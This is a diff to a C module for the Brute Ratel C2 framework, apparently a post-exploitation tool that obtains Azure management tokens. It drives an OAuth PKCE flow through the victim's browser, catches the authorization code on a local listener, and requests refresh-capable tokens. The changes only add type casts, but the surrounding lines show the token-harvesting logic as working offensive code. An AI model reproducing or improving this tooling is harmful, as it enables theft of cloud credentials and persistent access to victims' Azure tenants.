@@ -8,8 +8,8 @@ const char allowed_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx
 
 typedef struct _ctx {
     HANDLE listening;  // event set when we start listening and port has been set.
-    char PKCE[129];
-    char hashedPKCE[32];
+    unsigned char PKCE[129];
+    unsigned char hashedPKCE[32];
     char base64PKCE[46];  // 45 for null term
     char state[50];
     char tokens[16184];
@@ -49,7 +49,7 @@ void ConvertToChallenge(ctx *context) {
     BCRYPT_HASH_HANDLE hHash;
     BCRYPT$BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
     BCRYPT$BCryptCreateHash(alg, &hHash, NULL, 0, NULL, 0, 0);
-    DWORD length = MSVCRT$strnlen(context->PKCE, 128);
+    DWORD length = (DWORD)MSVCRT$strnlen((char*)context->PKCE, 128);
     BCRYPT$BCryptHashData(hHash, context->PKCE, length, 0);
     BCRYPT$BCryptFinishHash(hHash, context->hashedPKCE, 32, 0);
     BCRYPT$BCryptDestroyHash(hHash);
@@ -62,7 +62,7 @@ void ConvertToChallenge(ctx *context) {
 BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
     char WindowName[128] = {0};
     const char *host = (const char *)lParam;
-    DWORD WinLen = USER32$GetWindowTextA(hwnd, WindowName, 127);
+    DWORD WinLen = (DWORD)USER32$GetWindowTextA(hwnd, WindowName, 127);
 
     if (WindowName[0] != 0 && WinLen) {
         if (MSVCRT$strstr(WindowName, host) != NULL || MSVCRT$strstr(WindowName, "Redirecting") != NULL) {
@@ -83,7 +83,7 @@ static void SendMsg(SOCKET s) {
 DWORD GetCode(SOCKET s, ctx *context) {
     char *buffer = BadgerAlloc(16184);
     // this likely needs to be more robust, but starting here... famous last words
-    int size = WS2_32$recv(s, buffer, 16183, 0);
+    WS2_32$recv(s, buffer, 16183, 0);
     SendMsg(s);
     // figure out where the newline is, that should be our GET line w/ params
     // buffer[sizeof(buffer) - 1] = 0; //null off so strchr usage is safe
@@ -115,7 +115,7 @@ DWORD GetCode(SOCKET s, ctx *context) {
             while (*strend != '&' && strend != end) {
                 strend++;
             }
-            DWORD size = strend - start;
+            DWORD size = (DWORD)(strend - start);
             context->authcode = BadgerAlloc(size + 1);
             BadgerMemcpy(context->authcode, start, size);
             break;
@@ -125,7 +125,7 @@ DWORD GetCode(SOCKET s, ctx *context) {
             while (*strend != '&' && strend != end) {
                 strend++;
             }
-            DWORD size = strend - start;
+            DWORD size = (DWORD)(strend - start);
             context->error = BadgerAlloc(size + 1);
             BadgerMemcpy(context->error, start, size);
         } else if (MSVCRT$strncmp(start, "error_description=", 18) == 0) {
@@ -134,7 +134,7 @@ DWORD GetCode(SOCKET s, ctx *context) {
             while (*strend != '&' && strend != end) {
                 strend++;
             }
-            DWORD size = strend - start;
+            DWORD size = (DWORD)(strend - start);
             context->error_desc = BadgerAlloc(size + 1);
             BadgerMemcpy(context->error_desc, start, size);
         }
@@ -164,7 +164,7 @@ DWORD WINAPI ListenServer(void *_ctx) {
             BadgerDispatch(g_dispatch, "[-] This shouldn't be hit but we can't bind a socket so bailing\n");
             return 0;
         }
-        s = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        s = (SOCKET)WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         RtlGenRandom(&(context->port), 2);
         context->port = (context->port % 30000) + (u_short)30000;
         localaddr.sin_port = WS2_32$htons(context->port);
@@ -215,7 +215,7 @@ int RequestToken(flow_args *args, ctx *context) {
 
     // client_id, scope, code, redir_uri, plaintext PKCE
     const char *postFmt = "client_id=%s&scope=%s&code=%s&redirect_uri=%s&grant_type=authorization_code&code_verifier=%s";
-    length = MSVCRT$_snprintf(postData, 4096, postFmt, args->client_id, "https%3A%2F%2Fmanagement.core.windows.net%2F%2F.default+offline_access+openid+profile", context->authcode, redir_uri, context->PKCE);
+    length = (DWORD)MSVCRT$_snprintf(postData, 4096, postFmt, args->client_id, "https%3A%2F%2Fmanagement.core.windows.net%2F%2F.default+offline_access+openid+profile", context->authcode, redir_uri, context->PKCE);
 
     if (length <= 0 || length >= 4096) {
         BadgerDispatch(g_dispatch, "[-] Failed to format POST data or buffer overflow\n");
@@ -253,7 +253,7 @@ int RequestToken(flow_args *args, ctx *context) {
                                                          L"x-ms-client-request-id: 78000e7f-4e21-4054-bb00-9625900216c2\r\n"
                                                          L"x-ms-return-client-request-id: true\r\n"
                                                          L"Content-Type: application/x-www-form-urlencoded",
-                                                         -1, WINHTTP_ADDREQ_FLAG_ADD);
+                                                         0xFFFFFFFF, WINHTTP_ADDREQ_FLAG_ADD);
 
     if (!headersAdded) {
         BadgerDispatch(g_dispatch, "[-] WinHttpAddRequestHeaders failed with error %lu\n", KERNEL32$GetLastError());
@@ -294,7 +294,7 @@ void StartAuthCodeFlow(flow_args *args, ctx *context) {
     if (context == NULL) {
         return;
     }
-    GeneratePKCE(context->PKCE);
+    GeneratePKCE((char*)context->PKCE);
     if (context->PKCE[0] == '\0') {
         BadgerDispatch(g_dispatch, "[-] Failed to generate PKCE code\n");
         return;
@@ -413,7 +413,7 @@ void coffee(char **argv, int argc, WCHAR **dispatch) {
     args->hint = (BadgerStrcmp(argv[3], "0") == 0) ? NULL : argv[3];
     args->browser_path = (BadgerStrcmp(argv[4], "0") == 0) ? NULL : argv[4];
 
-    size_t bplen = args->browser_path ? BadgerStrlen(args->browser_path) : 0;
+    size_t bplen = args->browser_path ? BadgerStrlen((char*)args->browser_path) : 0;
 
     if (bplen > MAX_PATH) {
         BadgerDispatch(g_dispatch, "[-] Provided browser path is too long, must be <= %d\n", MAX_PATH);
